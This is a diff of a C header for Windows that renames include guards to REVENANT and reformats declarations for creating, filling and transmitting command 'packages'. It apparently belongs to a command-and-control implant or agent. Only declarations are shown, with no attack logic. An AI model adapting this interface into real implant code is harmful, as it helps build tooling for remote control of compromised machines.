@@ -1,5 +1,5 @@
-#ifndef REVNT_PACKAGE_H
-#define REVNT_PACKAGE_H
+#ifndef REVENANT_PACKAGE_H
+#define REVENANT_PACKAGE_H
 
 #include <windows.h>
 
@@ -12,44 +12,16 @@ typedef struct {
 } PACKAGE, *PPACKAGE;
 
 PPACKAGE PackageCreate( UINT32 CommandID );
-PPACKAGE PackageNew( VOID );
+PPACKAGE PackageNew(void);
 
-VOID PackageAddInt32(
-        PPACKAGE package,
-        UINT32 iData
-);
+VOID PackageAddInt32(PPACKAGE package, UINT32 iData);
+VOID PackageAddInt64(PPACKAGE Package, UINT64 dataInt);
+VOID PackageAddBytes(PPACKAGE package, PUCHAR data, size_t dataSize);
+VOID PackageAddPad(PPACKAGE package, PUCHAR data, size_t dataSize);
+VOID PackageDestroy(PPACKAGE package);
 
-VOID PackageAddInt64(
-        PPACKAGE Package,
-        UINT64 dataInt
-);
+BOOL PackageTransmit(PPACKAGE Package, PVOID *Response,PSIZE_T Size);
 
-VOID PackageAddBytes(
-        PPACKAGE package,
-        PUCHAR data,
-        size_t dataSize
-);
+VOID PackageTransmitError(UINT32 CommandID, UINT32 ErrorCode);
 
-VOID PackageAddPad(
-        PPACKAGE package,
-        PUCHAR data,
-        size_t dataSize
-);
-
-VOID PackageDestroy(
-        PPACKAGE package
-);
-
-BOOL PackageTransmit(
-        PPACKAGE Package,
-        PVOID*   Response,
-        PSIZE_T  Size
-);
-
-VOID PackageTransmitError(
-        UINT32 CommandID,
-        UINT32 ErrorCode
-);
-
-
-#endif
+#endif //REVENANT_PACKAGE_H
